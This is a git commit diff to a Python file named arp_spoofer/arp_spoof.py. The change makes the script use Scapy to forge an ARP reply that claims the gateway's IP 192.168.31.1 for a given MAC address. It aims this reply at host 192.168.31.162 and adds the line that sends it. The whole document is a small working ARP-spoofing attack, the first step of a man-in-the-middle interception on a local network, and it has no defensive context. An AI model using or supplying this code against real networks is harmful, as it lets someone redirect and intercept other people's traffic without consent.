bd80c1bbb0964f2f33cd9269e0bdf99b0b4b4cea
Abdullah Al Mohin Jaki <me.jaki@outlook.com>
2018-10-25 23:30:53 +0600

    sending arp response

--- arp_spoofer/arp_spoof.py
+++ arp_spoofer/arp_spoof.py
@@ -2,9 +2,9 @@
 import scapy.all as scapy
 
 paket = scapy.ARP(
-    op=2, pdst="192.168.146.147",
-    hwdst="fe80::20c:29ff:fee7:ccc9",
+    op=2,
+    pdst="192.168.31.162",
+    hwsrc="88:78:73:30:1C:95",
     psrc="192.168.31.1")
 
-
-
+scapy.send(paket)
